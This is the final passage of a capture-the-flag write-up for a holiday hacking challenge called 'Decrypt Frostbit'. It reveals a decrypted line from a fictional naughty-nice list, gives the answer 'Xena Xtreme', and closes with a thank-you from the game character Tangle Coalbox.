Output: Raw

And with that, we can finally reveal the contents of **line 440**:

**440,Xena Xtreme,13,Naughty,Had a surprise science experiment in the garage and left a mess with the supplies**

Honestly, I hope I never cross paths with someone named Xena...

Answer for Decrypt Frostbit: **Xena Xtreme**

#Final Message from Tangle Coalbox

After decrypting the naughty-nice list, Tangle Coalbox thanks us for saving Christmas!

![Tangle Coalbox Conversation 3](../../../../images/HHC/2024/Act%203/Decrypt%20Frostbit/Tangle Coalbox-3.png)



